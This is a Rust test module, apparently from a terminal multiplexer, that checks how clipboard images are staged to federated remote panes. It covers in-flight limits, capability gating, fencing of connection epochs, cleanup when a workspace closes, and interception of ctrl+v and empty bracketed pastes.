        app.handle_internal_event(AppEvent::FederationClipboardStageFailed {
            request_id: 31,
            failure: ClipboardStageFailure::QuotaExceeded,
            origin: host_key(HOST),
            connection_epoch: epoch,
        });

        assert!(app.pending_remote_clipboard_stages.is_empty());
        assert_eq!(
            app.state.toast.as_ref().unwrap().context,
            clipboard_stage_failure_context(ClipboardStageFailure::QuotaExceeded)
        );
        assert!(rx.try_recv().is_err());
    }

    #[tokio::test]
    async fn a_slow_stage_raises_the_saving_toast_only_while_the_request_is_still_pending() {
        let mut app = test_app();
        let (pane_id, _rx) = attach_runtime(&mut app, 0);
        let epoch = MountConnectionEpoch::mint();
        app.test_register_pending_clipboard_stage(
            41,
            pending_for(&app, pane_id, host_key(HOST), epoch),
        );
        app.raise_slow_stage_toast_if_pending(41);
        assert_eq!(app.state.toast.as_ref().unwrap().title, TOAST_TITLE_SAVING);

        app.state.toast = None;
        app.raise_slow_stage_toast_if_pending(42);
        assert!(
            app.state.toast.is_none(),
            "an already-resolved request must not raise the saving toast"
        );
    }

    #[tokio::test]
    async fn clipboard_stage_pending_entries_purged_on_workspace_close_and_mount_end() {
        // Workspace-close site: only the closing workspace's entry goes.
        let mut app = test_app();
        app.state
            .workspaces
            .push(crate::workspace::Workspace::test_new("survivor"));
        app.state.ensure_test_terminals();
        let (pane_a, _rx_a) = attach_runtime(&mut app, 0);
        let (pane_b, _rx_b) = attach_runtime(&mut app, 1);
        let epoch = MountConnectionEpoch::mint();
        app.test_register_pending_clipboard_stage(
            51,
            pending_for(&app, pane_a, host_key(HOST), epoch),
        );
        let survivor = PendingClipboardStage {
            workspace_id: app.state.workspaces[1].id.clone(),
            target_pane_id: pane_b,
            origin: host_key(HOST),
            connection_epoch: epoch,
            payload_len: 1,
            deadline: Instant::now() + Duration::from_secs(60),
        };
        app.test_register_pending_clipboard_stage(52, survivor);
        assert_eq!(app.pending_remote_clipboard_stages.len(), 2);

        let closing: HashSet<String> = [app.state.workspaces[0].id.clone()].into_iter().collect();
        app.purge_pending_remote_clipboard_stages_for_workspaces(&closing);
        assert!(!app.pending_remote_clipboard_stages.contains_key(&51));
        assert!(
            app.pending_remote_clipboard_stages.contains_key(&52),
            "an unrelated workspace's stage must survive"
        );

        // Mount-end site: only the ending connection's entries go.
        let mut app = test_app();
        let (pane_id, _rx) = attach_runtime(&mut app, 0);
        let ending = MountConnectionEpoch::mint();
        let fresh = MountConnectionEpoch::mint();
        app.test_register_pending_clipboard_stage(
            61,
            pending_for(&app, pane_id, host_key(HOST), ending),
        );
        app.test_register_pending_clipboard_stage(
            62,
            pending_for(&app, pane_id, host_key(HOST), fresh),
        );
        app.test_register_pending_clipboard_stage(
            63,
            pending_for(&app, pane_id, host_key("other-host"), ending),
        );
        assert_eq!(app.pending_remote_clipboard_stages.len(), 3);

        app.purge_pending_remote_clipboard_stages_for_origin(&host_key(HOST), ending);
        assert!(!app.pending_remote_clipboard_stages.contains_key(&61));
        assert!(
            app.pending_remote_clipboard_stages.contains_key(&62),
            "a fresh remount's stage must survive a superseded connection's teardown"
        );
        assert!(
            app.pending_remote_clipboard_stages.contains_key(&63),
            "another host's stage must survive"
        );
    }

    /// Registers a bare mirror for `HOST` at `epoch`, standing in for a live
    /// mount without needing a real pane runtime behind it.
    fn register_mirror(app: &mut App, epoch: MountConnectionEpoch) {
        use crate::remote::federation::id::{Mount, ServerInstanceId};
        let mut mirror = crate::remote::federation::reducer::RemoteMirror::new(Mount {
            host_key: host_key(HOST),
            // Unchanged across both mounts: the remote process never
            // restarted, which is precisely why the instance id cannot fence.
            server_instance_id: ServerInstanceId("inst-1".to_string()),
            mount_generation: 1,
        });
        mirror.set_connection_epoch(epoch);
        app.state.remote_mirrors.insert(host_key(HOST), mirror);
    }

    #[tokio::test]
    async fn a_delayed_mount_ended_event_does_not_purge_or_end_a_fresh_remount() {
        let mut app = test_app();
        let (pane_id, mut rx) = attach_runtime(&mut app, 0);

        // Mount A, then its replacement B against the same still-running remote.
        let superseded = MountConnectionEpoch::mint();
        register_mirror(&mut app, superseded);
        app.state.end_federation_mount(&host_key(HOST));
        let fresh = MountConnectionEpoch::mint();
        register_mirror(&mut app, fresh);
        app.test_register_pending_clipboard_stage(
            71,
            pending_for(&app, pane_id, host_key(HOST), fresh),
        );

        // A's end-notice finally arrives. Same host key, same generation.
        app.handle_federation_mount_ended(
            host_key(HOST),
            1,
            superseded,
            HOST.to_string(),
            "link closed".to_string(),
        );

        assert!(
            app.state.remote_mirrors.contains_key(&host_key(HOST)),
            "a superseded end-notice must not tear down the live remount"
        );
        assert!(
            app.pending_remote_clipboard_stages.contains_key(&71),
            "a superseded end-notice must not purge the live remount's work"
        );

        app.handle_internal_event(ready_event(71, &staged_path(), host_key(HOST), fresh));
        assert_eq!(rx.try_recv().unwrap(), Bytes::from(staged_path()));
    }

    #[tokio::test]
    async fn a_matching_mount_ended_event_purges_the_connection_it_names() {
        let mut app = test_app();
        let (pane_id, _rx) = attach_runtime(&mut app, 0);
        let epoch = MountConnectionEpoch::mint();
        register_mirror(&mut app, epoch);
        app.test_register_pending_clipboard_stage(
            73,
            pending_for(&app, pane_id, host_key(HOST), epoch),
        );

        app.handle_federation_mount_ended(
            host_key(HOST),
            1,
            epoch,
            HOST.to_string(),
            "link closed".to_string(),
        );

        assert!(
            app.pending_remote_clipboard_stages.is_empty(),
            "the ending connection's pending work must not leak"
        );
        assert!(!app.state.remote_mirrors.contains_key(&host_key(HOST)));
    }

    /// Builds a live remote-backed pane on workspace 0 and registers a mirror
    /// that has negotiated staging, so `begin_remote_clipboard_stage` can run
    /// end to end.
    fn attach_live_mount(
        app: &mut App,
    ) -> (
        PaneId,
        mpsc::UnboundedReceiver<crate::remote::federation::protocol::FederationMessage>,
    ) {
        attach_mount(app, true)
    }

    /// As `attach_live_mount`, but `staging` chooses whether the mount's peer
    /// agreed to `FILE_STAGING` — the one fact that separates a pane the
    /// image-paste intercept can serve from one it must refuse.
    fn attach_mount(
        app: &mut App,
        staging: bool,
    ) -> (
        PaneId,
        mpsc::UnboundedReceiver<crate::remote::federation::protocol::FederationMessage>,
    ) {
        use crate::remote::federation::id::{Mount, ServerInstanceId};
        use std::collections::BTreeSet;

        let pane_id = app.state.workspaces[0].tabs[0].root_pane;
        let terminal_id = app.state.workspaces[0].tabs[0].panes[&pane_id]
            .attached_terminal_id
            .clone();
        let (out_tx, out_rx) = mpsc::unbounded_channel();
        let (_output_tx, output_rx) = mpsc::channel::<Bytes>(4);
        let (clipboard_tx, _clipboard_rx) = mpsc::unbounded_channel();
        let (events_tx, _events_rx) = mpsc::channel::<AppEvent>(8);
        let runtime = crate::terminal::TerminalRuntime::spawn_remote(
            pane_id,
            24,
            80,
            1 << 16,
            crate::terminal_theme::TerminalTheme::default(),
            None,
            "term_1".to_string(),
            1,
            out_tx,
            output_rx,
            clipboard_tx,
            events_tx,
            Arc::new(Notify::new()),
            Arc::new(crate::render_signal::RenderSignal::new()),
        )
        .expect("a remote runtime needs no local PTY");
        app.terminal_runtimes.insert(terminal_id, runtime);

        let key = host_key(HOST);
        app.state.workspaces[0].worktree_space = Some(crate::workspace::WorktreeSpaceMembership {
            key: format!("federation:{}", key.as_str()),
            label: "remote".to_string(),
            repo_root: std::path::PathBuf::from("/"),
            checkout_path: std::path::PathBuf::from("/"),
            is_linked_worktree: false,
        });
        let mut mirror = crate::remote::federation::reducer::RemoteMirror::new(Mount {
            host_key: key.clone(),
            server_instance_id: ServerInstanceId("inst-1".to_string()),
            mount_generation: 1,
        });
        let mut caps = BTreeSet::new();
        if staging {
            caps.insert(Capability::new(Capability::FILE_STAGING));
        }
        mirror.set_agreed_capabilities(caps);
        mirror.set_connection_epoch(MountConnectionEpoch::mint());
        app.state.remote_mirrors.insert(key, mirror);
        (pane_id, out_rx)
    }

    fn test_image() -> crate::platform::ClipboardImage {
        crate::platform::ClipboardImage {
            bytes: vec![1, 2, 3, 4],
            extension: "png",
        }
    }

    #[tokio::test]
    async fn a_third_concurrent_stage_request_is_rejected_locally_at_the_in_flight_cap() {
        let mut app = test_app();
        let (pane_id, mut out_rx) = attach_live_mount(&mut app);
        let image = test_image();

        assert!(
            app.begin_remote_clipboard_stage(0, pane_id, &image).is_ok(),
            "the first stage must be accepted"
        );
        assert!(
            app.begin_remote_clipboard_stage(0, pane_id, &image).is_ok(),
            "the second stage must be accepted"
        );
        assert_eq!(app.pending_remote_clipboard_stages.len(), 2);
        let mut sent = Vec::new();
        while let Ok(msg) = out_rx.try_recv() {
            sent.push(msg);
        }
        assert_eq!(sent.len(), 2, "both accepted stages must reach the wire");

        app.state.toast = None;
        assert_eq!(
            app.begin_remote_clipboard_stage(0, pane_id, &image),
            Err(StageStartError::TooManyInFlight)
        );
        assert_eq!(
            app.pending_remote_clipboard_stages.len(),
            2,
            "a refused stage must not register"
        );
        assert!(
            out_rx.try_recv().is_err(),
            "a refused stage must not reach the wire"
        );
        assert!(
            app.state.toast.is_some(),
            "a refused stage must be reported"
        );

        // Resolving one of the first two frees a slot again.
        let resolved = *app
            .pending_remote_clipboard_stages
            .keys()
            .next()
            .expect("two stages are pending");
        app.pending_remote_clipboard_stages.remove(&resolved);
        assert!(app.begin_remote_clipboard_stage(0, pane_id, &image).is_ok());
        assert!(out_rx.try_recv().is_ok());
    }

    #[tokio::test]
    async fn a_stage_request_is_refused_when_the_mount_never_negotiated_staging() {
        let mut app = test_app();
        let (pane_id, mut out_rx) = attach_live_mount(&mut app);
        let key = host_key(HOST);
        app.state
            .remote_mirrors
            .get_mut(&key)
            .unwrap()
            .set_agreed_capabilities(std::collections::BTreeSet::new());

        assert_eq!(
            app.begin_remote_clipboard_stage(0, pane_id, &test_image()),
            Err(StageStartError::CapabilityNotAgreed)
        );
        assert!(
            out_rx.try_recv().is_err(),
            "an ungated stage frame would kill the mount"
        );
        assert!(app.pending_remote_clipboard_stages.is_empty());
        assert!(app.state.toast.is_some());
    }

    #[tokio::test]
    async fn a_stage_request_on_a_pane_without_a_live_mount_is_refused() {
        let mut app = test_app();
        let (pane_id, _rx) = attach_runtime(&mut app, 0);
        assert_eq!(
            app.begin_remote_clipboard_stage(0, pane_id, &test_image()),
            Err(StageStartError::NoLiveMount)
        );
        assert!(app.pending_remote_clipboard_stages.is_empty());
        assert!(app.state.toast.is_some());
    }

    // -----------------------------------------------------------------------
    // Input interception
    //
    // Restored from the fork's deleted `src/app/input/mod.rs`
    // (`mod remote_image_paste_tests`) and retargeted at the explicit
    // (workspace, pane) the server pane-input path now resolves, instead of
    // the active workspace's focused pane.
    // -----------------------------------------------------------------------

    use crate::input::TerminalKey;
    use crossterm::event::{KeyCode, KeyEventKind, KeyModifiers};

    /// Everything the mount has been handed since the last drain.
    fn drain(
        rx: &mut mpsc::UnboundedReceiver<crate::remote::federation::protocol::FederationMessage>,
    ) -> Vec<crate::remote::federation::protocol::FederationMessage> {
        let mut seen = Vec::new();
        while let Ok(msg) = rx.try_recv() {
            seen.push(msg);
        }
        seen
    }

    fn stage_requests(
        messages: &[crate::remote::federation::protocol::FederationMessage],
    ) -> Vec<&str> {
        messages
            .iter()
            .filter_map(|msg| match msg {
                crate::remote::federation::protocol::FederationMessage::ClipboardStageRequest(
                    request,
                ) => Some(request.original_filename.as_str()),
                _ => None,
            })
            .collect()
    }

    fn ctrl_v() -> TerminalKey {
        TerminalKey::new(KeyCode::Char('v'), KeyModifiers::CONTROL)
    }

    fn png(len: usize) -> crate::platform::ClipboardImage {
        crate::platform::ClipboardImage {
            bytes: vec![7u8; len],
            extension: "png",
        }
    }

    fn key_event(key: TerminalKey) -> crate::protocol::ClientPaneInputEvent {
        crate::protocol::ClientPaneInputEvent::from_terminal_key(key)
            .expect("ctrl+v is representable on the wire")
    }

    /// How many clipboard reads an input path started.
    ///
    /// Counted by their answers: a started read always resolves into exactly
    /// one `AppEvent::RemoteClipboardImageCaptured` on this App's own event
    /// channel, so the count is per-App and unaffected by other tests running
    /// in the same process. In a test build the read itself is the instant
    /// no-op seam (`clipboard_image_reader`), so this settles immediately
    /// instead of spawning one `osascript`/`wl-paste` per counted read.
    async fn clipboard_reads_started(app: &mut App) -> usize {
        let mut started = 0;
        loop {
            match tokio::time::timeout(Duration::from_millis(250), app.event_rx.recv()).await {
                Ok(Some(AppEvent::RemoteClipboardImageCaptured { .. })) => started += 1,
                Ok(Some(_)) => continue,
                Ok(None) | Err(_) => return started,
            }
        }
    }

    #[tokio::test]
    async fn image_paste_decision_is_capture_for_a_pane_of_a_staging_capable_mount() {
        let mut app = test_app();
        let (_pane_id, _out_rx) = attach_mount(&mut app, true);

        assert_eq!(
            remote_image_paste_decision(&app.state, 0, &ctrl_v()),
            RemoteImagePasteDecision::Capture
        );
        // A different key is not this intercept's business.
        assert_eq!(
            remote_image_paste_decision(
                &app.state,
                0,
                &TerminalKey::new(KeyCode::Char('c'), KeyModifiers::CONTROL)
            ),
            RemoteImagePasteDecision::FallThrough
        );
        // `keys.remote_image_paste = ""` turns the whole feature off.
        app.state.remote_image_paste_key = None;
        assert_eq!(
            remote_image_paste_decision(&app.state, 0, &ctrl_v()),
            RemoteImagePasteDecision::FallThrough
        );
    }

    #[tokio::test]
    async fn image_paste_decision_is_fall_through_for_a_local_pane() {
        let mut app = test_app();
        let (_pane_id, _rx) = attach_runtime(&mut app, 0);
        assert_eq!(
            remote_image_paste_decision(&app.state, 0, &ctrl_v()),
            RemoteImagePasteDecision::FallThrough
        );
    }

    #[tokio::test]
    async fn image_paste_decision_is_unsupported_when_the_mount_lacks_the_staging_capability() {
        let mut app = test_app();
        let (_pane_id, _out_rx) = attach_mount(&mut app, false);
        assert_eq!(
            remote_image_paste_decision(&app.state, 0, &ctrl_v()),
            RemoteImagePasteDecision::Unsupported
        );
    }

    #[tokio::test]
    async fn image_paste_stages_and_consumes_the_key_for_a_supplied_clipboard_image() {
        let mut app = test_app();
        let (pane_id, mut out_rx) = attach_mount(&mut app, true);

        assert_eq!(
            app.handle_remote_image_paste(0, pane_id, png(4)),
            ImagePasteOutcome::Staged
        );
        assert_eq!(app.pending_remote_clipboard_stages.len(), 1);
        assert_eq!(
            stage_requests(&drain(&mut out_rx)).len(),
            1,
            "a staged image must reach the wire exactly once"
        );
    }

    #[tokio::test]
    async fn oversized_clipboard_image_is_rejected_before_any_wire_send() {
        let mut app = test_app();
        let (pane_id, mut out_rx) = attach_mount(&mut app, true);
        let oversized = png(crate::protocol::MAX_CLIPBOARD_IMAGE_PAYLOAD + 1);

        assert_eq!(
            app.handle_remote_image_paste(0, pane_id, oversized),
            ImagePasteOutcome::Rejected
        );
        assert!(
            app.pending_remote_clipboard_stages.is_empty(),
            "a refused image must not register a pending stage"
        );
        assert!(
            drain(&mut out_rx).is_empty(),
            "an oversized frame would be a protocol violation on the wire"
        );
        assert_eq!(
            app.state.toast.as_ref().map(|toast| toast.context.as_str()),
            Some(TOAST_IMAGE_TOO_LARGE)
        );
    }

    /// How long the fake clipboard owner stalls. Long enough that a caller
    /// which waited for it could not possibly be mistaken for one that did
    /// not, short enough that the test is not slow.
    const FAKE_CLIPBOARD_STALL: Duration = Duration::from_millis(300);

    #[tokio::test]
    async fn a_clipboard_read_runs_off_the_caller_and_answers_as_an_event() {
        use crate::events::ClipboardImageCapture;

        let mut app = test_app();
        let (pane_id, _out_rx) = attach_mount(&mut app, true);
        let (tx, mut rx) = mpsc::channel(4);
        let started = Instant::now();
        spawn_clipboard_image_capture(
            tx,
            "ws-1".to_string(),
            pane_id,
            Duration::from_secs(30),
            || {
                std::thread::sleep(FAKE_CLIPBOARD_STALL);
                Some(png(4))
            },
        );
        // The caller here stands in for the single App event loop, which
        // drives rendering, every pane and the API loop. It has to come back
        // long before the clipboard owner does.
        let handed_back = started.elapsed();
        assert!(
            handed_back < FAKE_CLIPBOARD_STALL / 3,
            "the clipboard read blocked the caller for {handed_back:?}"
        );

        let ev = tokio::time::timeout(Duration::from_secs(10), rx.recv())
            .await
            .expect("the read must answer")
            .expect("the sender is still alive");
        match ev {
            AppEvent::RemoteClipboardImageCaptured {
                workspace_id,
                target_pane_id,
                capture: ClipboardImageCapture::Image(image),
            } => {
                assert_eq!(workspace_id, "ws-1");
                assert_eq!(target_pane_id, pane_id);
                assert_eq!(image, png(4));
            }
            other => panic!("expected the captured image, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn a_clipboard_owner_that_never_answers_is_abandoned_and_reported() {
        use crate::events::ClipboardImageCapture;

        let mut app = test_app();
        let (pane_id, _out_rx) = attach_mount(&mut app, true);
        let (tx, mut rx) = mpsc::channel(4);
        spawn_clipboard_image_capture(
            tx,
            "ws-1".to_string(),
            pane_id,
            Duration::from_millis(50),
            || {
                std::thread::sleep(Duration::from_secs(30));
                Some(png(4))
            },
        );

        let ev = tokio::time::timeout(Duration::from_secs(10), rx.recv())
            .await
            .expect("an abandoned read must still resolve the press")
            .expect("the sender is still alive");
        assert!(
            matches!(
                ev,
                AppEvent::RemoteClipboardImageCaptured {
                    capture: ClipboardImageCapture::ReadTimedOut,
                    ..
                }
            ),
            "expected an abandoned read, got {ev:?}"
        );

        let workspace_id = app.state.workspaces[0].id.clone();
        app.handle_internal_event(AppEvent::RemoteClipboardImageCaptured {
            workspace_id,
            target_pane_id: pane_id,
            capture: ClipboardImageCapture::ReadTimedOut,
        });
        assert_eq!(
            app.state.toast.as_ref().map(|toast| toast.context.as_str()),
            Some(TOAST_CLIPBOARD_READ_TIMED_OUT)
        );
    }

    #[tokio::test]
    async fn a_captured_clipboard_image_is_staged_for_the_workspace_that_asked() {
        use crate::events::ClipboardImageCapture;

        let mut app = test_app();
        let (pane_id, mut out_rx) = attach_mount(&mut app, true);
        let workspace_id = app.state.workspaces[0].id.clone();

        app.handle_internal_event(AppEvent::RemoteClipboardImageCaptured {
            workspace_id: workspace_id.clone(),
            target_pane_id: pane_id,
            capture: ClipboardImageCapture::Image(png(4)),
        });
        assert_eq!(app.pending_remote_clipboard_stages.len(), 1);
        assert_eq!(stage_requests(&drain(&mut out_rx)).len(), 1);

        // An empty clipboard is reported, not silently dropped.
        app.state.toast = None;
        app.handle_internal_event(AppEvent::RemoteClipboardImageCaptured {
            workspace_id,
            target_pane_id: pane_id,
            capture: ClipboardImageCapture::NoImage,
        });
        assert_eq!(
            app.state.toast.as_ref().map(|toast| toast.context.as_str()),
            Some(TOAST_NO_CLIPBOARD_IMAGE)
        );

        // A workspace that closed while the read ran takes its answer with it.
        app.pending_remote_clipboard_stages.clear();
        app.handle_internal_event(AppEvent::RemoteClipboardImageCaptured {
            workspace_id: "a-workspace-that-closed".to_string(),
            target_pane_id: pane_id,
            capture: ClipboardImageCapture::Image(png(4)),
        });
        assert!(app.pending_remote_clipboard_stages.is_empty());
    }

    /// The in-flight marker must be released on every answer, including the
    /// ones that stage nothing — otherwise one empty clipboard wedges the pane
    /// out of the feature for the life of the process.
    #[tokio::test]
    async fn an_answered_read_lets_the_same_pane_start_another_one() {
        use crate::events::ClipboardImageCapture;

        let mut app = test_app();
        let (pane_id, _out_rx) = attach_mount(&mut app, true);
        let workspace_id = app.state.workspaces[0].id.clone();

        app.begin_remote_clipboard_image_capture(0, pane_id, || None);
        assert!(app.remote_clipboard_image_reads_in_flight.contains(&pane_id));

        app.handle_internal_event(AppEvent::RemoteClipboardImageCaptured {
            workspace_id,
            target_pane_id: pane_id,
            capture: ClipboardImageCapture::NoImage,
        });
        assert!(
            !app.remote_clipboard_image_reads_in_flight.contains(&pane_id),
            "a 'no image' answer must not leave the pane unable to try again"
        );
    }

    #[tokio::test]
    async fn intercept_claims_the_image_paste_key_and_starts_one_read_on_a_mounted_remote_pane() {
        let mut app = test_app();
        let (pane_id, mut out_rx) = attach_mount(&mut app, true);
        let workspace_id = app.state.workspaces[0].id.clone();

        let kept = app.intercept_remote_image_paste_events(0, pane_id, vec![key_event(ctrl_v())]);
        assert!(
            kept.is_empty(),
            "the intercept must claim the key instead of forwarding it"
        );

        // The off-loop clipboard read is what proves the capture branch ran:
        // it answers as an event addressed at the pane the caller named,
        // whatever the OS clipboard happens to hold on this machine.
        match tokio::time::timeout(Duration::from_secs(10), app.event_rx.recv()).await {
            Ok(Some(AppEvent::RemoteClipboardImageCaptured {
                workspace_id: captured_workspace_id,
                target_pane_id,
                ..
            })) => {
                assert_eq!(captured_workspace_id, workspace_id);
                assert_eq!(target_pane_id, pane_id);
            }
            other => panic!("the capture branch must start a clipboard read, got {other:?}"),
        }
        assert!(
            drain(&mut out_rx).is_empty(),
            "a claimed key must not reach the remote PTY"
        );
    }

    #[tokio::test]
    async fn intercept_forwards_the_image_paste_key_on_a_local_pane() {
        let mut app = test_app();
        let (pane_id, _rx) = attach_runtime(&mut app, 0);

        let kept = app.intercept_remote_image_paste_events(0, pane_id, vec![key_event(ctrl_v())]);
        assert_eq!(
            kept.len(),
            1,
            "a local ctrl+v belongs to the pane app that wants it"
        );
        assert_eq!(
            clipboard_reads_started(&mut app).await,
            0,
            "a local pane must never trigger a clipboard read"
        );
    }

    #[tokio::test]
    async fn intercept_forwards_the_image_paste_key_when_the_binding_is_disabled() {
        let mut app = test_app();
        let (pane_id, _out_rx) = attach_mount(&mut app, true);
        app.state.remote_image_paste_key = None;

        let kept = app.intercept_remote_image_paste_events(0, pane_id, vec![key_event(ctrl_v())]);
        assert_eq!(kept.len(), 1);
        assert_eq!(
            clipboard_reads_started(&mut app).await,
            0,
            "a disabled binding must not read the clipboard"
        );
    }

    /// A held ctrl+v reports `Repeat` under the enhanced keyboard protocol.
    /// Each repeat would otherwise be a clipboard read, a blocking thread, a
    /// staged remote file and a pasted path. The repeats are still consumed:
    /// forwarding one would send the remote PTY the very `0x16` the press
    /// deliberately withheld.
    #[tokio::test]
    async fn intercept_starts_no_further_read_while_the_image_paste_key_is_held() {
        let mut app = test_app();
        let (pane_id, _out_rx) = attach_mount(&mut app, true);

        let mut events = vec![key_event(ctrl_v())];
        for _ in 0..5 {
            events.push(key_event(ctrl_v().with_kind(KeyEventKind::Repeat)));
        }
        let kept = app.intercept_remote_image_paste_events(0, pane_id, events);
        assert!(
            kept.is_empty(),
            "the press and its repeats all belong to the intercept"
        );
        assert_eq!(
            clipboard_reads_started(&mut app).await,
            1,
            "the press starts one clipboard read and the five repeats start none"
        );
    }

    #[tokio::test]
    async fn intercept_forwards_the_key_and_reports_once_when_the_mount_cannot_stage() {
        let mut app = test_app();
        let (pane_id, _out_rx) = attach_mount(&mut app, false);

        let kept = app.intercept_remote_image_paste_events(0, pane_id, vec![key_event(ctrl_v())]);
        assert_eq!(
            kept.len(),
            1,
            "a key the feature can never serve must still reach the pane app"
        );
        assert_eq!(
            app.state.toast.as_ref().map(|toast| toast.context.as_str()),
            Some(TOAST_REMOTE_TOO_OLD)
        );

        // Reported once per pane: the key reaches the pane app, so pressing it
        // again is ordinary use and an unconditional toast would be noise.
        app.state.toast = None;
        let kept = app.intercept_remote_image_paste_events(0, pane_id, vec![key_event(ctrl_v())]);
        assert_eq!(kept.len(), 1);
        assert!(app.state.toast.is_none());
        assert_eq!(
            clipboard_reads_started(&mut app).await,
            0,
            "a peer that cannot stage must not cause a clipboard read"
        );
    }

    /// Measured on macOS: Warp answers Cmd+V with an image-only clipboard by
    /// emitting an empty bracketed paste, because the image has no text
    /// flavor. On a staging-capable mount that is an image paste.
    #[tokio::test]
    async fn empty_bracketed_paste_starts_one_clipboard_read_on_a_mounted_remote_pane() {
        let mut app = test_app();
        let (pane_id, mut out_rx) = attach_mount(&mut app, true);

        let kept = app.intercept_remote_image_paste_events(
            0,
            pane_id,
            vec![crate::protocol::ClientPaneInputEvent::Paste(String::new())],
        );
        assert!(kept.is_empty());
        assert_eq!(clipboard_reads_started(&mut app).await, 1);
        assert!(drain(&mut out_rx).is_empty());
    }

    /// `keys.remote_image_paste = ""` is the documented off switch for
    /// clipboard image paste, so it must silence this trigger too — otherwise
    /// a user who turned the feature off to stop herdr reading their clipboard
    /// still gets a clipboard read out of an ordinary Cmd+V.
    #[tokio::test]
    async fn empty_bracketed_paste_is_forwarded_when_the_binding_is_disabled() {
        let mut app = test_app();
        let (pane_id, _out_rx) = attach_mount(&mut app, true);
        app.state.remote_image_paste_key = None;

        let kept = app.intercept_remote_image_paste_events(
            0,
            pane_id,
            vec![crate::protocol::ClientPaneInputEvent::Paste(String::new())],
        );
        assert_eq!(kept.len(), 1);
        assert_eq!(clipboard_reads_started(&mut app).await, 0);
    }

    /// Ordinary pasted text on a federated pane is still text. Only the exact
    /// shape of a terminal's image-drop path, in a recognized drop location,
    /// is claimed.
    #[tokio::test]
    async fn ordinary_pasted_text_on_a_mounted_remote_pane_is_forwarded_untouched() {
        let mut app = test_app();
        let (pane_id, _out_rx) = attach_mount(&mut app, true);

        let kept = app.intercept_remote_image_paste_events(
            0,
            pane_id,
            vec![crate::protocol::ClientPaneInputEvent::Paste(
                "cargo nextest run".to_string(),
            )],
        );
        assert_eq!(kept.len(), 1);
        assert_eq!(clipboard_reads_started(&mut app).await, 0);
    }

    /// A pane with no live mount does no per-event work at all: this is the
    /// hot path every keystroke on every local pane takes.
    #[tokio::test]
    async fn intercept_returns_local_pane_events_untouched() {
        let mut app = test_app();
        let (pane_id, _rx) = attach_runtime(&mut app, 0);
        let events = vec![
            key_event(TerminalKey::new(KeyCode::Char('a'), KeyModifiers::empty())),
            crate::protocol::ClientPaneInputEvent::Paste("x".to_string()),
        ];
        let kept = app.intercept_remote_image_paste_events(0, pane_id, events.clone());
        assert_eq!(kept, events);
    }

    /// The other half of the hot-path contract, and the one a live mount could
    /// silently break: ordinary typing on a pane that *is* federated must come
    /// back byte-identical and must not read the clipboard. Only the bound key
    /// gets past the per-event pre-filter, so every other keystroke costs two
    /// enum comparisons and nothing else.
    #[tokio::test]
    async fn intercept_returns_ordinary_keystrokes_on_a_federated_pane_untouched() {
        let mut app = test_app();
        let (pane_id, mut out_rx) = attach_mount(&mut app, true);
        let events = vec![
            key_event(TerminalKey::new(KeyCode::Char('a'), KeyModifiers::empty())),
            key_event(TerminalKey::new(KeyCode::Char('b'), KeyModifiers::empty())),
            // Same letter as the binding, without its modifier: it survives the
            // cheap code-only pre-filter and must still be forwarded by the
            // full combo match behind it.
            key_event(TerminalKey::new(KeyCode::Char('v'), KeyModifiers::empty())),
            key_event(TerminalKey::new(KeyCode::Enter, KeyModifiers::empty())),
        ];

        let kept = app.intercept_remote_image_paste_events(0, pane_id, events.clone());

        assert_eq!(kept, events, "ordinary typing must reach the pane unchanged");
        assert_eq!(
            clipboard_reads_started(&mut app).await,
            0,
            "ordinary typing must not read the clipboard"
        );
        assert!(
            app.remote_clipboard_image_reads_in_flight.is_empty(),
            "ordinary typing must leave no read outstanding"
        );
        assert!(app.state.toast.is_none(), "ordinary typing must be quiet");
        assert!(drain(&mut out_rx).is_empty(), "nothing may reach the wire");
    }

    #[tokio::test]
    async fn remote_image_paste_pane_state_is_purged_when_the_workspace_closes() {
        let mut app = test_app();
        let (pane_id, _out_rx) = attach_mount(&mut app, true);
        let other_pane = PaneId::alloc();

        app.remote_image_paste_unsupported_notices.insert(pane_id);
        app.remote_image_paste_unsupported_notices.insert(other_pane);
        app.remote_clipboard_image_reads_in_flight.insert(pane_id);
        app.remote_clipboard_image_reads_in_flight.insert(other_pane);

        let mut closing = std::collections::HashSet::new();
        closing.insert(app.state.workspaces[0].id.clone());
        app.purge_remote_image_paste_pane_state_for_workspaces(&closing);

        assert!(!app.remote_image_paste_unsupported_notices.contains(&pane_id));
        assert!(!app.remote_clipboard_image_reads_in_flight.contains(&pane_id));
        assert!(
            app.remote_image_paste_unsupported_notices
                .contains(&other_pane),
            "a pane outside the closing workspaces must be left alone"
        );
        assert!(app
            .remote_clipboard_image_reads_in_flight
            .contains(&other_pane));
    }
}
